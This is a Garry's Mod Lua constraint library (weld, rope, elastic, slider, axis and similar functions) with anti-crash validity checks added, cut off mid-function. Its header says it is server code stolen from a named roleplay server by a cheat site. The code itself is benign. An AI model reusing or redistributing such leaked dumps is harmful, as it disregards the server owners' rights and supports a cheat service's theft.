--Stealed clientside server code by exechack.cc
--Hostname: Ψ UkraineRP #1 ◈ Оновлення◈ Набiр ◈ M9K - Part 4/10 - 06/04/2025


--PATH addons/________anticrash/lua/includes/modules/constraint.lua:
-- [[ MODIFIED BY ZOMBIE EXTINGUISHER ]]

/*
	Add more valid ent checks to avoid constraint errors crashing servers
*/

if ( SERVER ) then

	-- If you're a server admin and you want your physics to spazz out less you can
	-- use the convar. The higher you set it the more accurate physics will be.
	-- This is set to 4 by default, since we are a physics mod.

	CreateConVar( "gmod_physiterations", "4", { FCVAR_REPLICATED, FCVAR_ARCHIVE } )

end

module( "constraint", package.seeall )

-- Clients don't need this module.
if ( CLIENT ) then return end

-- I think 128 constraints is around the max that causes the crash
-- So at this number we'll refuse to add more to the system
local MAX_CONSTRAINTS_PER_SYSTEM = 100
local CurrentSystem = nil
local SystemLookup = {}

hook.Add( "EntityRemoved", "Constraint Library - ConstraintRemoved", function( Ent )
	local System = SystemLookup[ Ent ]
	if ( !IsValid( System ) ) then return end

	System.__ConstraintCount = ( System.__ConstraintCount or 0 ) - 1

	if System.__ConstraintCount <= 0 then
		System.__BadConstraintSystem = true
		System:Remove()
	end
end )

local invalidConstraints = 0
local function ConstraintCreated( Constraint )
	
	-- Zombie: Some more checks in case CreateConstraintSystem fails
	if IsValid( CurrentSystem, Constraint ) then
		SystemLookup[ Constraint ] = CurrentSystem
		CurrentSystem.__ConstraintCount = ( CurrentSystem.__ConstraintCount or 0 ) + 1
	else
		invalidConstraints = invalidConstraints + 1
		-- print('DEBUG - INVALID CONSTRAINTS', invalidConstraints)
	end
	
end

--[[----------------------------------------------------------------------
	CreateConstraintSystem
------------------------------------------------------------------------]]
local function CreateConstraintSystem()

	local iterations = GetConVarNumber( "gmod_physiterations" )

	local System = ents.Create( "phys_constraintsystem" )
	
	-- Zombie: why no check here either? :)
	if !IsValid(System) then return end
	
	System:SetKeyValue( "additionaliterations", iterations )
	System:Spawn()
	System:Activate()
	System.__ConstraintCount = 0

	return System

end


--[[----------------------------------------------------------------------
	FindOrCreateConstraintSystem

	Takes 2 entities. If the entities don't have a constraint system
	associated with them it creates one and associates it with them.

	It then returns the constraint system
------------------------------------------------------------------------]]
local function FindOrCreateConstraintSystem( Ent1, Ent2 )

	local System = nil

	Ent2 = Ent2 or Ent1

	-- Does Ent1 have a constraint system?
	if ( !Ent1:IsWorld() && IsValid( Ent1.ConstraintSystem ) && !Ent1.ConstraintSystem.__BadConstraintSystem ) then
		System = Ent1.ConstraintSystem
	end

	-- Don't add to this system - we have too many constraints on it already.
	if ( IsValid( System ) && ( System.__ConstraintCount or 0 ) >= MAX_CONSTRAINTS_PER_SYSTEM ) then System = nil end

	-- Does Ent2 have a constraint system?
	if ( !IsValid( System ) && !Ent2:IsWorld() && IsValid( Ent2.ConstraintSystem ) && !Ent2.ConstraintSystem.__BadConstraintSystem ) then
		System = Ent2.ConstraintSystem
	end

	-- Don't add to this system - we have too many constraints on it already.
	if ( IsValid( System ) && ( System.__ConstraintCount or 0 ) >= MAX_CONSTRAINTS_PER_SYSTEM ) then System = nil end

	-- No constraint system yet (Or they're both full) - make a new one
	if ( !IsValid( System ) ) then

		--Msg( "New Constrant System\n" )
		System = CreateConstraintSystem()

	end

	Ent1.ConstraintSystem = System
	Ent2.ConstraintSystem = System

	return System

end


--[[----------------------------------------------------------------------
	onStartConstraint( Ent1, Ent2 )
	Should be called before creating a constraint
------------------------------------------------------------------------]]
local function onStartConstraint( Ent1, Ent2 )

	-- Get constraint system
	CurrentSystem = FindOrCreateConstraintSystem( Ent1, Ent2 )

	-- Any constraints called after this call will use this system
	SetPhysConstraintSystem( CurrentSystem )

end

--[[----------------------------------------------------------------------
	onFinishConstraint( Ent1, Ent2 )
	Should be called before creating a constraint
------------------------------------------------------------------------]]
local function onFinishConstraint( Ent1, Ent2 )

	-- Turn off constraint system override
	CurrentSystem = nil
	SetPhysConstraintSystem( NULL )

end

local function SetPhysicsCollisions( Ent, b )

	if ( !IsValid( Ent ) or !IsValid( Ent:GetPhysicsObject() ) ) then return end

	Ent:GetPhysicsObject():EnableCollisions( b )

end

--[[----------------------------------------------------------------------
	RemoveConstraints( Ent, Type )
	Removes all constraints of type from entity
------------------------------------------------------------------------]]
function RemoveConstraints( Ent, Type )

	if ( !Ent.Constraints ) then return end

	local c = Ent.Constraints
	local i = 0

	for k, v in pairs( c ) do

		if ( !IsValid( v ) ) then

			c[ k ] = nil

		elseif ( v.Type == Type ) then

			-- Make sure physics collisions are on!
			-- If we don't the unconstrained objects will fall through the world forever.
			SetPhysicsCollisions( v.Ent1, true )
			SetPhysicsCollisions( v.Ent2, true )

			c[ k ] = nil
			v:Remove()

			i = i + 1
		end

	end

	if ( table.IsEmpty( c ) ) then
		-- Update the network var and clear the constraints table.
		Ent:IsConstrained()
	end

	local bool = i != 0
	return bool, i

end


--[[----------------------------------------------------------------------
	RemoveAll( Ent )
	Removes all constraints from entity
------------------------------------------------------------------------]]
function RemoveAll( Ent )

	if ( !Ent.Constraints ) then return end

	local c = Ent.Constraints
	local i = 0
	for k, v in pairs( c ) do

		if ( IsValid( v ) ) then

			-- Make sure physics collisions are on!
			-- If we don't the unconstrained objects will fall through the world forever.
			SetPhysicsCollisions( v.Ent1, true )
			SetPhysicsCollisions( v.Ent2, true )

			v:Remove()
			i = i + 1
		end
	end

	-- Update the network var and clear the constraints table.
	Ent:IsConstrained()

	local bool = i != 0
	return bool, i

end

--[[----------------------------------------------------------------------
	Find( Ent1, Ent2, Type, Bone1, Bone2 )
	Returns a constraint of given type between the two entities, if one exists
------------------------------------------------------------------------]]
function Find( Ent1, Ent2, Type, Bone1, Bone2 )

	if ( !Ent1.Constraints ) then return end

	for k, v in pairs( Ent1.Constraints ) do

		if ( IsValid( v ) && v.Type == Type ) then

			if ( v.Ent1 == Ent1 && v.Ent2 == Ent2 && v.Bone1 == Bone1 && v.Bone2 == Bone2 ) then
				return v
			end

			if ( v.Ent2 == Ent1 && v.Ent1 == Ent2 && v.Bone2 == Bone1 && v.Bone1 == Bone2 ) then
				return v
			end

		end

	end

	return nil

end

--[[----------------------------------------------------------------------
	CanConstrain( Ent, Bone )
	Returns false if we shouldn't be constraining this entity
------------------------------------------------------------------------]]
function CanConstrain( Ent, Bone )

	if ( !Ent ) then return false end
	if ( !isnumber( Bone ) ) then return false end
	if ( !Ent:IsWorld() && !Ent:IsValid() ) then return false end
	if ( !IsValid( Ent:GetPhysicsObjectNum( Bone ) ) ) then return false end

	return true

end

--[[----------------------------------------------------------------------
	CalcElasticConsts( ... )
	This attempts to scale the elastic constraints such as the winch
	to keep a stable but responsive constraint..
------------------------------------------------------------------------]]
local function CalcElasticConsts( Phys1, Phys2, Ent1, Ent2, iFixed )

	local minMass = 0

	if ( Ent1:IsWorld() ) then minMass = Phys2:GetMass()
	elseif ( Ent2:IsWorld() ) then minMass = Phys1:GetMass()
	else
		minMass = math.min( Phys1:GetMass(), Phys2:GetMass() )
	end

	-- const, damp
	local const = minMass * 100
	local damp = const * 0.2

	if ( iFixed == 0 ) then

		const = minMass * 50
		damp = const * 0.1

	end

	return const, damp

end


--[[----------------------------------------------------------------------
	CreateKeyframeRope( ... )
	Creates a rope without any constraint
------------------------------------------------------------------------]]
function CreateKeyframeRope( Pos, width, material, Constraint, Ent1, LPos1, Bone1, Ent2, LPos2, Bone2, kv )

	-- No rope if 0 or minus
	if ( width <= 0 ) then return nil end

	-- Clamp the rope to a sensible width
	width = math.Clamp( width, 0.2, 100 )

	local rope = ents.Create( "keyframe_rope" )
	
	-- Zombie: Why was this check not here? :)
	if !IsValid(rope) then 
		return
	end
	
	rope:SetPos( Pos )
	rope:SetKeyValue( "Width", width )

	if ( isstring( material ) ) then
		local mat = Material( material )
		if ( material && !string.find( mat:GetShader():lower(), "spritecard" ) ) then rope:SetKeyValue( "RopeMaterial", material ) end
	end

	-- Attachment point 1
	rope:SetEntity( "StartEntity", Ent1 )
	rope:SetKeyValue( "StartOffset", tostring( LPos1 ) )
	rope:SetKeyValue( "StartBone", Bone1 )

	-- Attachment point 2
	rope:SetEntity( "EndEntity", Ent2 )
	rope:SetKeyValue( "EndOffset", tostring( LPos2 ) )
	rope:SetKeyValue( "EndBone", Bone2 )

	if ( kv ) then
		for k, v in pairs( kv ) do

			rope:SetKeyValue( k, tostring( v ) )

		end
	end

	rope:Spawn()
	rope:Activate()

	-- Delete the rope if the attachments get killed
	Ent1:DeleteOnRemove( rope )
	Ent2:DeleteOnRemove( rope )
	if ( IsValid( Constraint ) ) then Constraint:DeleteOnRemove( rope ) end

	return rope

end

--[[----------------------------------------------------------------------
	AddConstraintTable( Ent, Constraint, Ent2, Ent3, Ent4 )
	Stores info about the constraints on the entity's table
------------------------------------------------------------------------]]
function AddConstraintTable( Ent, Constraint, Ent2, Ent3, Ent4 )

	if ( !IsValid( Constraint ) ) then return end

	if ( IsValid( Ent ) ) then

		Ent.Constraints = Ent.Constraints or {}
		table.insert( Ent.Constraints, Constraint )
		Ent:DeleteOnRemove( Constraint )

	end

	if ( Ent2 && Ent2 != Ent ) then
		AddConstraintTable( Ent2, Constraint, Ent3, Ent4 )
	end

end

--[[----------------------------------------------------------------------
	AddConstraintTableNoDelete( Ent, Constraint, Ent2, Ent3, Ent4 )
	Stores info about the constraints on the entity's table
------------------------------------------------------------------------]]
function AddConstraintTableNoDelete( Ent, Constraint, Ent2, Ent3, Ent4 )

	if ( !IsValid( Constraint ) ) then return end

	if ( IsValid( Ent ) ) then

		Ent.Constraints = Ent.Constraints or {}
		table.insert( Ent.Constraints, Constraint )

	end

	if ( Ent2 && Ent2 != Ent ) then
		AddConstraintTableNoDelete( Ent2, Constraint, Ent3, Ent4 )
	end

end


--[[----------------------------------------------------------------------
	Weld( ... )
	Creates a solid weld constraint
------------------------------------------------------------------------]]
function Weld( Ent1, Ent2, Bone1, Bone2, forcelimit, nocollide, deleteonbreak )

	if ( Ent1 == Ent2 && Bone1 == Bone2 ) then return false end
	if ( !CanConstrain( Ent1, Bone1 ) ) then return false end
	if ( !CanConstrain( Ent2, Bone2 ) ) then return false end

	if ( Find( Ent1, Ent2, "Weld", Bone1, Bone2 ) ) then

		-- A weld already exists between these two physics objects.
		-- There's totally no point in re-creating it. It doesn't make
		-- the weld any stronger - that's just an urban legend.
		return false

	end

	-- Don't weld World to objects, weld objects to World!
	-- Prevents crazy physics on some props
	if ( Ent1:IsWorld() ) then
		Ent1 = Ent2
		Ent2 = game.GetWorld()
	end

	local Phys1 = Ent1:GetPhysicsObjectNum( Bone1 )
	local Phys2 = Ent2:GetPhysicsObjectNum( Bone2 )

	onStartConstraint( Ent1, Ent2 )

		-- Create the constraint
		local Constraint = ents.Create( "phys_constraint" )
		
		-- Zombie: Why was this check not here? :)
		if !IsValid(Constraint) then 
			onFinishConstraint( Ent1, Ent2 )
			return
		end
		
		ConstraintCreated( Constraint )
		if ( forcelimit ) then Constraint:SetKeyValue( "forcelimit", forcelimit ) end
		if ( nocollide ) then Constraint:SetKeyValue( "spawnflags", 1 ) end
		Constraint:SetPhysConstraintObjects( Phys2, Phys1 )
		Constraint:Spawn()
		Constraint:Activate()

	onFinishConstraint( Ent1, Ent2 )
	AddConstraintTable( Ent1, Constraint, Ent2 )

	-- Optionally delete Ent1 when the weld is broken
	-- This is to fix bug #310
	if ( deleteonbreak ) then
		Ent2:DeleteOnRemove( Ent1 )
	end

	-- Make a constraints table
	local ctable = {
		Type = "Weld",
		Ent1 = Ent1,
		Ent2 = Ent2,
		Bone1 = Bone1,
		Bone2 = Bone2,
		forcelimit = forcelimit,
		nocollide = nocollide,
		deleteonbreak = deleteonbreak
	}

	Constraint:SetTable( ctable )

	Phys1:Wake()
	Phys2:Wake()

	_G.C = Constraint

	return Constraint

end
duplicator.RegisterConstraint( "Weld", Weld, "Ent1", "Ent2", "Bone1", "Bone2", "forcelimit", "nocollide", "deleteonbreak" )


--[[----------------------------------------------------------------------
	Rope( ... )
	Creates a rope constraint - with rope!
------------------------------------------------------------------------]]
function Rope( Ent1, Ent2, Bone1, Bone2, LPos1, LPos2, length, addlength, forcelimit, width, material, rigid )

	if ( !CanConstrain( Ent1, Bone1 ) ) then return false end
	if ( !CanConstrain( Ent2, Bone2 ) ) then return false end

	local Phys1 = Ent1:GetPhysicsObjectNum( Bone1 )
	local Phys2 = Ent2:GetPhysicsObjectNum( Bone2 )
	local WPos1 = Phys1:LocalToWorld( LPos1 )
	local WPos2 = Phys2:LocalToWorld( LPos2 )
	local addlength = math.Clamp( addlength or 0, -56756, 56756 )
	local Constraint = nil

	-- Make Constraint
	if ( Phys1 != Phys2 ) then

		onStartConstraint( Ent1, Ent2 )

			-- Create the constraint
			Constraint = ents.Create( "phys_lengthconstraint" )
			
			-- Zombie: Why was this check not here? :)
			if !IsValid(Constraint) then 
				onFinishConstraint( Ent1, Ent2 )
				return
			end
		
			ConstraintCreated( Constraint )
			Constraint:SetPos( WPos1 )
			Constraint:SetKeyValue( "attachpoint", tostring( WPos2 ) )
			Constraint:SetKeyValue( "minlength", "0.0" )
			Constraint:SetKeyValue( "length", length + addlength )
			if ( forcelimit ) then Constraint:SetKeyValue( "forcelimit", forcelimit ) end
			if ( rigid ) then Constraint:SetKeyValue( "spawnflags", 2 ) end
			Constraint:SetPhysConstraintObjects( Phys1, Phys2 )
			Constraint:Spawn()
			Constraint:Activate()

		onFinishConstraint( Ent1, Ent2 )

	end

	-- Make Rope
	local kv = {
		Length = length + addlength,
		Collide = 1
	}
	if ( rigid ) then kv.Type = 2 end

	local rope = CreateKeyframeRope( WPos1, width, material, Constraint, Ent1, LPos1, Bone1, Ent2, LPos2, Bone2, kv )

	-- What the fuck
	if ( !Constraint ) then Constraint, rope = rope, nil end

	local ctable = {
		Type = "Rope",
		Ent1 = Ent1,
		Ent2 = Ent2,
		Bone1 = Bone1,
		Bone2 = Bone2,
		LPos1 = LPos1,
		LPos2 = LPos2,
		length = length,
		addlength = addlength,
		forcelimit = forcelimit,
		width = width,
		material = material,
		rigid = rigid
	}

	if ( IsValid( Constraint ) ) then
		Constraint:SetTable( ctable )
		AddConstraintTable( Ent1, Constraint, Ent2 )
	end

	return Constraint, rope

end
duplicator.RegisterConstraint( "Rope", Rope, "Ent1", "Ent2", "Bone1", "Bone2", "LPos1", "LPos2", "length", "addlength", "forcelimit", "width", "material", "rigid" )

--[[----------------------------------------------------------------------
	Elastic( ... )
	Creates an elastic constraint
------------------------------------------------------------------------]]
function Elastic( Ent1, Ent2, Bone1, Bone2, LPos1, LPos2, constant, damping, rdamping, material, width, stretchonly )

	if ( !CanConstrain( Ent1, Bone1 ) ) then return false end
	if ( !CanConstrain( Ent2, Bone2 ) ) then return false end

	local Phys1 = Ent1:GetPhysicsObjectNum( Bone1 )
	local Phys2 = Ent2:GetPhysicsObjectNum( Bone2 )
	local WPos1 = Phys1:LocalToWorld( LPos1 )
	local WPos2 = Phys2:LocalToWorld( LPos2 )

	local Constraint = nil
	local rope = nil

	-- Make Constraint
	if ( Phys1 != Phys2 ) then

		onStartConstraint( Ent1, Ent2 )

			Constraint = ents.Create( "phys_spring" )
			
			-- Zombie: Why was this check not here? :)
			if !IsValid(Constraint) then 
				onFinishConstraint( Ent1, Ent2 )
				return
			end
			
			ConstraintCreated( Constraint )
			Constraint:SetPos( WPos1 )
			Constraint:SetKeyValue( "springaxis", tostring( WPos2 ) )
			Constraint:SetKeyValue( "constant", constant )
			Constraint:SetKeyValue( "damping", damping )
			Constraint:SetKeyValue( "relativedamping", rdamping )
			Constraint:SetPhysConstraintObjects( Phys1, Phys2 )
			if ( stretchonly == 1 or stretchonly == true ) then
				Constraint:SetKeyValue( "spawnflags", 1 )
			end

			Constraint:Spawn()
			Constraint:Activate()

		onFinishConstraint( Ent1, Ent2 )
		AddConstraintTable( Ent1, Constraint, Ent2 )

		local ctable = {
			Type = "Elastic",
			Ent1 = Ent1,
			Ent2 = Ent2,
			Bone1 = Bone1,
			Bone2 = Bone2,
			LPos1 = LPos1,
			LPos2 = LPos2,
			constant = constant,
			damping = damping,
			rdamping = rdamping,
			material = material,
			width = width,
			length = ( WPos1 - WPos2 ):Length(),
			stretchonly = stretchonly,
		}

		Constraint:SetTable( ctable )

		-- Make Rope
		local kv = {
			Collide = 1,
			Type = 0
		}

		rope = CreateKeyframeRope( WPos1, width, material, Constraint, Ent1, LPos1, Bone1, Ent2, LPos2, Bone2, kv )
	end

	return Constraint, rope
end
duplicator.RegisterConstraint("Elastic", Elastic, "Ent1", "Ent2", "Bone1", "Bone2", "LPos1", "LPos2", "constant", "damping", "rdamping", "material", "width", "stretchonly")


--[[----------------------------------------------------------------------
	Keepupright( ... )
	Creates a KeepUpright constraint
------------------------------------------------------------------------]]
function Keepupright( Ent, Ang, Bone, angularlimit )

	if ( !CanConstrain( Ent, Bone ) ) then return false end
	if ( Ent:GetClass() != "prop_physics" && Ent:GetClass() != "prop_ragdoll" ) then return false end
	if ( !angularlimit or angularlimit < 0 ) then return end

	local Phys = Ent:GetPhysicsObjectNum(Bone)

	-- Remove any KU's already on entity
	RemoveConstraints( Ent, "Keepupright" )

	onStartConstraint( Ent )

		local Constraint = ents.Create( "phys_keepupright" )
		
		-- Zombie: Why was this check not here? :)
		if !IsValid(Constraint) then 
			onFinishConstraint( Ent )
			return
		end
		
		ConstraintCreated( Constraint )
		Constraint:SetAngles( Ang )
		Constraint:SetKeyValue( "angularlimit", angularlimit )
		Constraint:SetPhysConstraintObjects( Phys, Phys )
		Constraint:Spawn()
		Constraint:Activate()

	onFinishConstraint( Ent )
	AddConstraintTable( Ent, Constraint )

	local ctable = {
		Type = "Keepupright",
		Ent1 = Ent,
		Ang = Ang,
		Bone = Bone,
		angularlimit = angularlimit
	}
	Constraint:SetTable( ctable )

	--
	-- This is a hack to keep the KeepUpright context menu in sync..
	--
	Ent:SetNWBool( "IsUpright", true )

	return Constraint

end
duplicator.RegisterConstraint( "Keepupright", Keepupright, "Ent1", "Ang", "Bone", "angularlimit" )


function CreateStaticAnchorPoint( Pos )

	-- Creates an invisible frozen, not interactive prop.
	local Anchor = ents.Create( "gmod_anchor" )

	Anchor:SetPos( Pos )
	Anchor:Spawn()
	Anchor:Activate()

	return Anchor, Anchor:GetPhysicsObject(), 0, Vector( 0, 0, 0 )

end


--[[----------------------------------------------------------------------
	Slider( ... )
	Creates a slider constraint
------------------------------------------------------------------------]]
function Slider( Ent1, Ent2, Bone1, Bone2, LPos1, LPos2, width, material )

	-- TODO: If we get rid of sliders we can get rid of gmod_anchor too!

	if ( !CanConstrain( Ent1, Bone1 ) ) then return false end
	if ( !CanConstrain( Ent2, Bone2 ) ) then return false end

	local Phys1 = Ent1:GetPhysicsObjectNum( Bone1 )
	local Phys2 = Ent2:GetPhysicsObjectNum( Bone2 )
	local WPos1 = Phys1:LocalToWorld( LPos1 )
	local WPos2 = Phys2:LocalToWorld( LPos2 )
	local StaticAnchor = nil

	-- Make Constraint
	if ( Phys1 == Phys2 ) then return end

	-- Make Rope
	local kv = {
		Collide = 0,
		Type = 2,
		Subdiv = 1,
	}

	-- Start World Hack.
	-- Attaching a slider to the world makes it really sucks so we make
	-- a prop and attach to that.

	if ( Ent1:IsWorld() ) then

		Ent1, Phys1, Bone1, LPos1 = CreateStaticAnchorPoint( WPos1 )
		StaticAnchor = Ent1

	end

	if ( Ent2:IsWorld() ) then

		Ent2, Phys2, Bone2, LPos2 = CreateStaticAnchorPoint( WPos2 )
		StaticAnchor = Ent2

	end

	-- End World Hack.

	onStartConstraint( Ent1, Ent2 )

		local Constraint = ents.Create("phys_slideconstraint")
		
		-- Zombie: Why was this check not here? :)
		if !IsValid(Constraint) then 
			onFinishConstraint( Ent1, Ent2 )
			return
		end
		
		ConstraintCreated( Constraint )
		Constraint:SetPos( WPos1 )
		Constraint:SetKeyValue( "slideaxis", tostring( WPos2 ) )
		Constraint:SetPhysConstraintObjects( Phys1, Phys2 )
		Constraint:Spawn()
		Constraint:Activate()

	onFinishConstraint( Ent1, Ent2 )
	AddConstraintTable( Ent1, Constraint, Ent2 )

	local rope = CreateKeyframeRope( WPos1, width, material, Constraint, Ent1, LPos1, Bone1, Ent2, LPos2, Bone2, kv )

	-- If we have a static anchor - delete it when we die.
	if ( StaticAnchor ) then

		Constraint:DeleteOnRemove( StaticAnchor )

	end

	local ctable = {
		Type = "Slider",
		Ent1 = Ent1,
		Ent2 = Ent2,
		Bone1 = Bone1,
		Bone2 = Bone2,
		LPos1 = LPos1,
		LPos2 = LPos2,
		width = width,
		material = material
	}

	Constraint:SetTable( ctable )

	return Constraint, rope

end
duplicator.RegisterConstraint( "Slider", Slider, "Ent1", "Ent2", "Bone1", "Bone2", "LPos1", "LPos2", "width", "material" )

--[[----------------------------------------------------------------------
	Axis( ... )
	Creates an axis constraint
------------------------------------------------------------------------]]
function Axis( Ent1, Ent2, Bone1, Bone2, LPos1, LPos2, forcelimit, torquelimit, friction, nocollide, LocalAxis, DontAddTable )

	if ( !CanConstrain( Ent1, Bone1 ) ) then return false end
	if ( !CanConstrain( Ent2, Bone2 ) ) then return false end

	local Phys1 = Ent1:GetPhysicsObjectNum( Bone1 )
	local Phys2 = Ent2:GetPhysicsObjectNum( Bone2 )
	local WPos1 = Phys1:LocalToWorld( LPos1 )
	local WPos2 = Phys2:LocalToWorld( LPos2 )

	if ( Phys1 == Phys2 ) then return false end

	-- If we have a LocalAxis, use that
	if ( LocalAxis ) then
		WPos2 = Phys1:LocalToWorld( LocalAxis )
	end

	onStartConstraint( Ent1, Ent2 )

		local Constraint = ents.Create("phys_hinge")
		
		-- Zombie: Why was this check not here? :)
		if !IsValid(Constraint) then 
			onFinishConstraint( Ent1, Ent2 )
			return
		end
		
		ConstraintCreated( Constraint )
		Constraint:SetPos( WPos1 )
		Constraint:SetKeyValue( "hingeaxis", tostring( WPos2 ) )
		if ( forcelimit && forcelimit > 0 ) then Constraint:SetKeyValue( "forcelimit", forcelimit ) end
		if ( torquelimit && torquelimit > 0 ) then Constraint:SetKeyValue( "torquelimit", torquelimit ) end
		if ( friction && friction > 0 ) then Constraint:SetKeyValue( "hingefriction", friction ) end
		if ( nocollide && nocollide > 0 ) then Constraint:SetKeyValue( "spawnflags", 1 ) end
		Constraint:SetPhysConstraintObjects( Phys1, Phys2 )
		Constraint:Spawn()
		Constraint:Activate()

	onFinishConstraint( Ent1, Ent2 )

	if ( !DontAddTable ) then
		AddConstraintTable( Ent1, Constraint, Ent2 )
	end

	local ctable = {
		Type = "Axis",
		Ent1 = Ent1,
		Ent2 = Ent2,
		Bone1 = Bone1,
		Bone2 = Bone2,
		LPos1 = LPos1,
		LPos2 = LPos2,
		forcelimit = forcelimit,
		torquelimit = torquelimit,
		friction = friction,
		nocollide = nocollide,
		LocalAxis = Phys1:WorldToLocal( WPos2 )
	}

	Constraint:SetTable( ctable )

	return Constraint

end
duplicator.RegisterConstraint( "Axis", Axis, "Ent1", "Ent2", "Bone1", "Bone2", "LPos1", "LPos2", "forcelimit", "torquelimit", "friction", "nocollide", "LocalAxis", "DontAddTable" )


--[[----------------------------------------------------------------------
	AdvBallsocket( ... )
	Creates an advanced ballsocket (ragdoll) constraint
------------------------------------------------------------------------]]
function AdvBallsocket( Ent1, Ent2, Bone1, Bone2, LPos1, LPos2, forcelimit, torquelimit, xmin, ymin, zmin, xmax, ymax, zmax, xfric, yfric, zfric, onlyrotation, nocollide )

	if ( !CanConstrain( Ent1, Bone1 ) ) then return false end
	if ( !CanConstrain( Ent2, Bone2 ) ) then return false end

	local Phys1 = Ent1:GetPhysicsObjectNum( Bone1 )
	local Phys2 = Ent2:GetPhysicsObjectNum( Bone2 )
	local WPos1 = Phys1:LocalToWorld( LPos1 )
	-- local WPos2 = Phys2:LocalToWorld( LPos2 )

	if ( Phys1 == Phys2 ) then return false end

	-- Make Constraint
	onStartConstraint( Ent1, Ent2 )

		local flags = 0
		if ( onlyrotation && onlyrotation > 0 ) then flags = flags + 2 end
		if ( nocollide && nocollide > 0 ) then flags = flags + 1 end

		local Constraint = ents.Create("phys_ragdollconstraint")
		
		-- Zombie: Why was this check not here? :)
		if !IsValid(Constraint) then 
			onFinishConstraint( Ent1, Ent2 )
			return
		end
		
		ConstraintCreated( Constraint )
		Constraint:SetPos( WPos1 )
		Constraint:SetKeyValue( "xmin", xmin )
		Constraint:SetKeyValue( "xmax", xmax )
		Constraint:SetKeyValue( "ymin", ymin )
		Constraint:SetKeyValue( "ymax", ymax )
		Constraint:SetKeyValue( "zmin", zmin )
		Constraint:SetKeyValue( "zmax", zmax )
		if ( xfric && xfric > 0 ) then Constraint:SetKeyValue( "xfriction", xfric ) end
		if ( yfric && yfric > 0 ) then Constraint:SetKeyValue( "yfriction", yfric ) end
		if ( zfric && zfric > 0 ) then Constraint:SetKeyValue( "zfriction", zfric ) end
		if ( forcelimit && forcelimit > 0 ) then Constraint:SetKeyValue( "forcelimit", forcelimit ) end
		if ( torquelimit && torquelimit > 0 ) then Constraint:SetKeyValue( "torquelimit", torquelimit ) end
		Constraint:SetKeyValue( "spawnflags", flags )
		Constraint:SetPhysConstraintObjects( Phys1, Phys2 )
		Constraint:Spawn()
		Constraint:Activate()

	onFinishConstraint( Ent1, Ent2 )
	AddConstraintTable( Ent1, Constraint, Ent2 )

	local ctable = {
		Type = "AdvBallsocket",
		Ent1 = Ent1,
		Ent2 = Ent2,
		Bone1 = Bone1,
		Bone2 = Bone2,
		LPos1 = LPos1,
		LPos2 = LPos2,
		forcelimit = forcelimit,
		torquelimit = torquelimit,
		xmin = xmin,
		ymin = ymin,
		zmin = zmin,
		xmax = xmax,
		ymax = ymax,
		zmax = zmax,
		xfric = xfric,
		yfric = yfric,
		zfric = zfric,
		onlyrotation = onlyrotation,
		nocollide = nocollide
	}

	Constraint:SetTable( ctable )

	return Constraint

end
duplicator.RegisterConstraint( "AdvBallsocket", AdvBallsocket, "Ent1", "Ent2", "Bone1", "Bone2", "LPos1", "LPos2", "forcelimit", "torquelimit", "xmin", "ymin", "zmin", "xmax", "ymax", "zmax", "xfric", "yfric", "zfric", "onlyrotation", "nocollide")


--[[----------------------------------------------------------------------
	NoCollide( ... )
	Creates an nocollide `constraint'
------------------------------------------------------------------------]]
function NoCollide( Ent1, Ent2, Bone1, Bone2 )

	if ( !CanConstrain( Ent1, Bone1 ) ) then return false end
	if ( !CanConstrain( Ent2, Bone2 ) ) then return false end

	local Phys1 = Ent1:GetPhysicsObjectNum( Bone1 )
	local Phys2 = Ent2:GetPhysicsObjectNum( Bone2 )

	if ( Phys1 == Phys2 ) then return false end

	if ( Find( Ent1, Ent2, "NoCollide", Bone1, Bone2 ) ) then

		return false

	end

	-- Make Constraint
	onStartConstraint( Ent1, Ent2 )

		local Constraint = ents.Create("logic_collision_pair")
		
		-- Zombie: Why was this check not here? :)
		if !IsValid(Constraint) then 
			onFinishConstraint( Ent1, Ent2 )
			return
		end
		
		ConstraintCreated( Constraint )
		Constraint:SetKeyValue( "startdisabled", 1 )
		Constraint:SetPhysConstraintObjects( Phys1, Phys2 )
		Constraint:Spawn()
		Constraint:Activate()
		Constraint:Input( "DisableCollisions", nil, nil, nil )

	onFinishConstraint( Ent1, Ent2 )
	AddConstraintTable( Ent1, Constraint, Ent2 )

	local ctable = {
		Type = "NoCollide",
		Ent1 = Ent1,
		Ent2 = Ent2,
		Bone1 = Bone1,
		Bone2 = Bone2,
	}

	Constraint:SetTable( ctable )

	return Constraint

end
duplicator.RegisterConstraint( "NoCollide", NoCollide, "Ent1", "Ent2", "Bone1", "Bone2" )


--[[----------------------------------------------------------------------
	MotorControl( pl, motor, onoff, dir )
	Numpad controls for the motor constraints
------------------------------------------------------------------------]]
local function MotorControl( pl, motor, onoff, dir )

	if ( !IsValid( motor ) ) then return false end

	local activate = false

	if ( motor.toggle == 1 ) then

		-- Toggle mode, only do something when the key is pressed
		-- if the motor is off, turn it on, and vice-versa.
		-- This only happens if the same key as the current
		-- direction is pressed, otherwise the direction is changed
		-- with the motor being left on.

		if ( onoff ) then

			if ( motor.direction == dir or !motor.is_on ) then

				-- Direction is the same, Activate if the motor is off
				-- Deactivate if the motor is on.

				motor.is_on = !motor.is_on

				activate = motor.is_on

			else

				-- Change of direction, make sure it's activated

				activate = true

			end

		else

			return

		end

	else

		-- normal mode: activate is based on the key status
		-- (down = on, up = off)

		activate = onoff

	end

	if ( activate ) then

		motor:Fire( "Activate", "", 0 ) -- Turn on the motor
		motor:Fire( "Scale", dir, 0 ) -- This makes the direction change

	else
		motor:Fire( "Deactivate", "", 0 ) -- Turn off the motor
	end

	motor.direction = dir

	return true

end
numpad.Register( "MotorControl", MotorControl )

--[[----------------------------------------------------------------------
	Motor( ... )
	Creates a motor constraint
------------------------------------------------------------------------]]
function Motor( Ent1, Ent2, Bone1, Bone2, LPos1, LPos2, friction, torque, forcetime, nocollide, toggle, pl, forcelimit, numpadkey_fwd, numpadkey_bwd, direction, LocalAxis )

	if ( !CanConstrain( Ent1, Bone1 ) ) then return false end
	if ( !CanConstrain( Ent2, Bone2 ) ) then return false end

	-- Get information we're about to use
	local Phys1 = Ent1:GetPhysicsObjectNum( Bone1 )
	local Phys2 = Ent2:GetPhysicsObjectNum( Bone2 )
	local WPos1 = Phys1:LocalToWorld( LPos1 )
	local WPos2 = Phys2:LocalToWorld( LPos2 )

	if ( Phys1 == Phys2 ) then return false end

	if ( LocalAxis ) then
		WPos2 = Phys1:LocalToWorld( LocalAxis )
	end

	-- The true at the end stops it adding the axis table to the entity's count stuff.
	local axis = Axis( Ent1, Ent2, Bone1, Bone2, LPos1, LPos2, 0, 0, friction, nocollide, LocalAxis, true )

	-- Delete the axis when either object dies
	Ent1:DeleteOnRemove( axis )
